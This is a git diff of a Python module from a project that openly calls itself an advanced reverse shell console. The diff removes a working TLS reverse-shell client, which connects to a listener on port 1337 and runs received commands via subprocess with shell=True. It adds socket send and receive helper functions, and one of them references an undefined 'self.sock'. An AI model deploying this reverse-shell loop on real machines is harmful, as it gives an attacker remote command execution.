@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    This package implements an advanced reverse shell console.
-#    Copyright (C) 2023  Maurice Lambert
+#    TCP utils function for ReverseShell.
+#    Copyright (C) 2023  ReverseShell
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -20,8 +20,7 @@
 ###################
 
 """
-This package implements an advanced reverse shell
-console (supports: TCP, UDP, IRC, HTTP and DNS).
+TCP utils function for ReverseShell.
 """
 
 __version__ = "0.0.1"
@@ -30,53 +29,57 @@ __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
-This package implements an advanced reverse shell
-console (supports: TCP, UDP, IRC, HTTP and DNS).
+TCP utils function for ReverseShell.
 """
-license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/ReverseShell"
 
-copyright = """
+__all__ = ["receiveall", "sendall"]
+
+__license__ = "GPL-3.0 License"
+__copyright__ = """
 ReverseShell  Copyright (C) 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
 """
-__license__ = license
-__copyright__ = copyright
-
-__all__ = []
+copyright = __copyright__
+license = __license__
 
 print(copyright)
 
-from os.path import join
+from ssl import SSLWantReadError
 from socket import socket
-from contextlib import suppress
-from subprocess import run, PIPE
-from ssl import SSLContext, PROTOCOL_TLS_CLIENT
 
-context = SSLContext(PROTOCOL_TLS_CLIENT)
-context.load_verify_locations(join("..", "server.crt"))
+def receiveall(socket: socket, timeout: bool = True) -> bytes:
+    """
+    This method gets all packets sent.
+    """
 
+    data = socket.recv(65535)
+    socket.settimeout(0.5) if timeout else self.sock.setblocking(False)
 
-def sendall(data):
+    while True:
+        try:
+            data += socket.recv(65535)
+        except (BlockingIOError, SSLWantReadError, TimeoutError):
+            break
+
+    socket.setblocking(True)
+    return data
+
+def sendall(socket: socket, data: bytes, timeout: bool = True) -> None:
+    """
+    This function sends all data in TCP segment
+    (multiple TCP packets if timeout else only one TCP packet).
+    """
+
+    if not timeout:
+        socket.sendall(data)
+        return None
+
     chunk = data[:30000]
     data = data[30000:]
     while chunk:
-        ss.sendall(chunk)
+        socket.sendall(chunk)
         chunk = data[:30000]
         data = data[30000:]
-
-
-data = b" "
-while True:
-    with suppress(Exception):
-        s = socket()
-        ss = context.wrap_socket(s, server_hostname="localhost")
-        ss.connect(("127.0.0.1", 1337))
-        sendall(data)
-        command = ss.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
-        ss.close()
-        s.close()
